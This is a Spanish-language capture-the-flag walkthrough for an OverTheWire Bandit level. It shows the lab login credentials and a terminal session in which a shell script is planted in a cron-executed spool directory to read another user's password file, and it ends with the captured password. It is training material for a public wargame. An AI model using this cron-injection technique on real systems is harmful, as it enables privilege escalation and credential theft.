## Objetivo

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso
**username**: bandit23
**host**:  bandit.labs.overthewire.org
**password**: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
**port**: 2220
## Solución
```
bandit23@bandit:~$ mkdir /tmp/my23
bandit23@bandit:~$ cd /tmp/my23
bandit23@bandit:/tmp/my23$ vi mys.sh
bandit23@bandit:/tmp/my23$ chmod +x mys.sh
bandit23@bandit:/tmp/my23$
bandit23@bandit:/tmp/my23$ cp mys.sh /var/spool/bandit24/
cp: cannot create regular file '/var/spool/bandit24/mys.sh': Operation not permitted
bandit23@bandit:/tmp/my23$ cat mys.sh
#!/bin/sh
cat /etc/bandit_pass/bandit24 >> /tmp/my23/bandit24pass
bandit23@bandit:/tmp/my23$ chmod 777 mys.sh
bandit23@bandit:/tmp/my23$ cp mys.sh /var/spool/bandit24/
cp: cannot create regular file '/var/spool/bandit24/mys.sh': Operation not permitted
bandit23@bandit:/tmp/my23$ cp mys.sh /var/spool/bandit23/
cp: cannot create regular file '/var/spool/bandit23/': Not a directory
bandit23@bandit:/tmp/my23$ ls -la /var/spool/bandit24/
total 12
dr-xr-x---  3 bandit24 bandit23 4096 Oct  5 06:19 .
drwxr-xr-x  5 root     root     4096 Oct  5 06:19 ..
drwxrwx-wx 90 root     bandit24 4096 Feb 27 18:02 foo
bandit23@bandit:/tmp/my23$ cp mys.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/my23$ ls -la .
total 408
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 27 17:52 .
drwxrwx-wt 1323 root     root     405504 Feb 27 18:03 ..
-rwxrwxrwx    1 bandit23 bandit23     66 Feb 27 17:52 mys.sh
bandit23@bandit:/tmp/my23$ cat mys.sh
#!/bin/sh
cat /etc/bandit_pass/bandit24 >> /tmp/my23/bandit24pass
bandit23@bandit:/tmp/my23$ touch bandit24pass
bandit23@bandit:/tmp/my23$ ls -la
total 408
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 27 18:03 .
drwxrwx-wt 1323 root     root     405504 Feb 27 18:04 ..
-rw-rw-r--    1 bandit23 bandit23      0 Feb 27 18:03 bandit24pass
-rwxrwxrwx    1 bandit23 bandit23     66 Feb 27 17:52 mys.sh
bandit23@bandit:/tmp/my23$ chmod 777 bandit24pass
bandit23@bandit:/tmp/my23$ cp mys.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/my23$ ls -la
total 412
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 27 18:03 .
drwxrwx-wt 1323 root     root     405504 Feb 27 18:05 ..
-rwxrwxrwx    1 bandit23 bandit23     33 Feb 27 18:05 bandit24pass
-rwxrwxrwx    1 bandit23 bandit23     66 Feb 27 17:52 mys.sh
bandit23@bandit:/tmp/my23$ cat bandit24pass
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
## Notas adicionales

Podemos analizar scripts que se estén ejecutando en el sistema y aprovecharnos de los permisos que tiene ese proceso para inyectar codigo malicioso que nos permita el acceso a su contraseña.

## Referencias
